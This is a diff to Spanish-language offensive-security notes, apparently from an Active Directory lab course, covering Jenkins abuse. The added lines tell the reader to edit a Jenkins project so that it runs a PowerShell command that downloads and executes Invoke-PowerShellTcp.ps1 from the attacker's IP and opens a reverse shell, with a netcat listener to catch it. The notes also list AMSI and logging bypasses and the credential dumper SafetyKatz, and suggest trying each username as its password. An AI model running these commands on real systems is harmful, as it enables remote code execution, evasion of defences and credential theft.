@@ -184,9 +184,17 @@ Find-PSRemotingLocalAdminAccess
 ### Abuso de Jenkins
 Deberemos de acceder al Jenkins en la URL correspondiente, En *Peopel* encontraremos usuarios por lo que podemos probar a usar *user-as-password* 
 
-Después de eso deberemos iniciar *HSF* y cargar en el *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loades.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*
+Después de eso deberemos iniciar *HSF* y cargar en el *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loader.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*
 
+Irnos a un proyecto, editarlo y añadir la siguiente reverse shell
+```shell
+powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 1889
+```
 
+Tambien deberemos de ponernos en escucha desde nuestra shell
+```shell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1889
+```
 ### Abuso de GPO
 #### GPOddity
 
